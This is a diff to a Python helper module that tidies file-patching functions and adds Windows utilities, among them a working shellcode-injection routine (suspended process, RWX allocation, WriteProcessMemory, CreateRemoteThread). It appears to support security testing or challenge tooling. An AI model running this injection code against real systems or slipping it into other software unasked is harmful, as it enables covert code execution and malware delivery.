@@ -1,5 +1,6 @@
 import binascii
 import contextlib
+import typing
 import errno
 import getpass
 import logging
@@ -130,7 +131,7 @@ def create_file_with_data(path: Path | str, data: str | bytes) -> None:
 
 
 @contextlib.contextmanager
-def file_with_data(path: str, data: str | bytes):
+def file_with_data(path: str | Path, data: str | bytes):
     data_bytes = data.encode("utf-8") if isinstance(data, str) else data
 
     with open(path, "wb+") as f:
@@ -158,11 +159,12 @@ def patch_file_with_bytes(source_file: Path, old_bytes: bytes, new_bytes: bytes,
     _ = Path(target_file).write_bytes(patched_data)
 
 
-def patch_file_with_regex(source_file: Path, regex: bytes | str, new_bytes: bytes, target_file: Path | None = None):
+def patch_file_with_regex(source_file: Path, regex: bytes | str, new_data: bytes | str, target_file: Path | None = None):
     target_file = target_file or source_file
+    data = new_data if isinstance(new_data, bytes) else new_data.encode("utf-8")
     log.info(
         f"Patching `{source_file}`, replaving matches to `{regex}` regex with "
-        f"`{binascii.b2a_hex(new_bytes)}` bytes, and saving as `{target_file}`"
+        f"`{binascii.b2a_hex(data)}` bytes, and saving as `{target_file}`"
     )
 
     regex_bytes = regex if isinstance(regex, bytes) else regex.encode("utf-8")
@@ -173,7 +175,7 @@ def patch_file_with_regex(source_file: Path, regex: bytes | str, new_bytes: byte
         log.warning("No regex matches found")
         return
 
-    contents = re.sub(regex_bytes, new_bytes, contents)
+    contents = re.sub(regex_bytes, data, contents)
     _ = Path(target_file).write_bytes(contents)
 
 
@@ -485,3 +487,112 @@ def print_file(path: str | Path):
     print(f"Contents of `{path}`:")
     data = file_path.read_bytes()
     print(data.rstrip())
+
+
+## Windows utils
+
+
+@typing.no_type_check
+def get_process_pid(pname: str) -> int | None:
+    import ctypes
+
+    TH32CS_SNAPPROCESS = 0x00000002
+
+    DWORD = ctypes.c_uint32
+    LONG = ctypes.c_int32
+    NULL_T = ctypes.c_void_p
+    TCHAR = ctypes.c_char
+    MAX_PATH = 260
+
+    class PROCESSENTRY32(ctypes.Structure):
+        _fields_ = [
+            ("dwSize", DWORD),
+            ("cntUsage", DWORD),
+            ("th32ProcessID", DWORD),
+            ("th32DefaultHeapID", NULL_T),
+            ("th32ModuleID", DWORD),
+            ("cntThreads", DWORD),
+            ("th32ParentProcessID", DWORD),
+            ("pcPriClassBase", LONG),
+            ("dwFlags", DWORD),
+            ("szExeFile", TCHAR * MAX_PATH),
+        ]
+
+    CreateToolhelp32Snapshot = ctypes.windll.kernel32.CreateToolhelp32Snapshot
+    Process32First = ctypes.windll.kernel32.Process32First
+    Process32Next = ctypes.windll.kernel32.Process32Next
+    CloseHandle = ctypes.windll.kernel32.CloseHandle
+
+    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+    pe32 = PROCESSENTRY32()
+    pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
+
+    if Process32First(hProcessSnap, ctypes.byref(pe32)) == 0:
+        log.info("Failed getting first process")
+        return
+
+    while True:
+        procname = pe32.szExeFile.decode("utf-8").lower()
+        if pname.lower() in procname:
+            CloseHandle(hProcessSnap)
+            return pe32.th32ProcessID
+        if not Process32Next(hProcessSnap, ctypes.byref(pe32)):
+            CloseHandle(hProcessSnap)
+            return None
+
+
+@typing.no_type_check
+def inject_shellcode(path: Path, shellcode: bytes):
+    import ctypes
+    import ctypes.wintypes
+
+    from ctypes import windll
+    from ctypes.wintypes import BOOL
+    from ctypes.wintypes import DWORD
+    from ctypes.wintypes import HANDLE
+    from ctypes.wintypes import LPVOID
+    from ctypes.wintypes import LPCVOID
+    import win32process
+
+    # created suspended process
+    info = win32process.CreateProcess(None, path, None, None, False, 0x04, None, None, win32process.STARTUPINFO())
+    page_rwx_value = 0x40
+    memcommit = 0x00001000
+
+    class _SECURITY_ATTRIBUTES(ctypes.Structure):
+        _fields_ = [
+            ("nLength", DWORD),
+            ("lpSecurityDescriptor", LPVOID),
+            ("bInheritHandle", BOOL),
+        ]
+
+    LPSECURITY_ATTRIBUTES = ctypes.POINTER(_SECURITY_ATTRIBUTES)
+    LPTHREAD_START_ROUTINE = LPVOID
+
+    if info[0].handle > 0:
+        log.info(f"Created {path} Suspended")
+    shellcode_length = len(shellcode)
+    process_handle = info[0].handle  # phandle
+    VirtualAllocEx = windll.kernel32.VirtualAllocEx
+    VirtualAllocEx.restype = LPVOID
+    VirtualAllocEx.argtypes = (HANDLE, LPVOID, DWORD, DWORD, DWORD)
+
+    WriteProcessMemory = ctypes.windll.kernel32.WriteProcessMemory
+    WriteProcessMemory.restype = BOOL
+    WriteProcessMemory.argtypes = (HANDLE, LPVOID, LPCVOID, DWORD, DWORD)
+    CreateRemoteThread = ctypes.windll.kernel32.CreateRemoteThread
+    CreateRemoteThread.restype = HANDLE
+    CreateRemoteThread.argtypes = (HANDLE, LPSECURITY_ATTRIBUTES, DWORD, LPTHREAD_START_ROUTINE, LPVOID, DWORD, DWORD)
+
+    # allocate RWX memory
+    lpBuffer = VirtualAllocEx(process_handle, 0, shellcode_length, memcommit, page_rwx_value)
+    log.info(f"Allocated remote memory at {hex(lpBuffer)}")
+
+    # write shellcode in allocated memory
+    res = WriteProcessMemory(process_handle, lpBuffer, shellcode, shellcode_length, 0)
+    if res > 0:
+        log.info("Shellcode written")
+
+    # create remote thread to start shellcode execution
+    CreateRemoteThread(process_handle, None, 0, lpBuffer, 0, 0, 0)
+    log.info("Shellcode Injection, done")
